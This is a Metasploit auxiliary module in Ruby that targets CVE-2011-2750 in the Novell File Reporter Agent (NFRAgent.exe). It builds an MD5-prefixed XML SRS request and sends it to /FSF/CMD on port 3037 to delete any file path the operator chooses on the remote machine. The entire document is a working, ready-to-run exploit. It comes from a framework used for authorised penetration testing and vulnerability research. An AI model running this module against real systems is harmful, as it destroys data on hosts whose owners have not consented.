##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell File Reporter Agent Arbitrary File Delete',
      'Description'    => %q{
          NFRAgent.exe in Novell File Reporter allows remote attackers to delete
        arbitrary files via a full pathname in an SRS request with OPERATION set to 4 and
        CMD set to 5 against /FSF/CMD. This module has been tested successfully on NFR
        Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1) on
        Windows platforms.
      },
      'Author'         => [
        'Luigi Auriemma', # Vulnerability discovery and Poc
        'juan vazquez' # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2011-2750' ],
          [ 'OSVDB', '73729' ],
          [ 'URL', 'http://aluigi.org/adv/nfr_2-adv.txt'],
        ]
      ))

      register_options(
        [
          Opt::RPORT(3037),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('RPATH', [ true, "The remote file path to delete", "c:\\test.txt" ]),
        ])
  end

  def run
    peer = "#{rhost}:#{rport}"
    record = "<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>5</CMD><PATH>#{datastore['RPATH']}</PATH></RECORD>"
    md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
    message = md5 + record

    print_status("Trying to delete #{datastore['RPATH']}...")

    res = send_request_cgi(
      {
        'uri'     => '/FSF/CMD',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "text/xml",
        'data'    => message,
      }, 5)

    if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\/VERSION><STATUS>0<\/STATUS><TRANSID>0<\/TRANSID><\/RESULT>/
      print_good("File #{datastore['RPATH']} successfully deleted")
    else
      print_error("File not deleted")
    end
  end
end
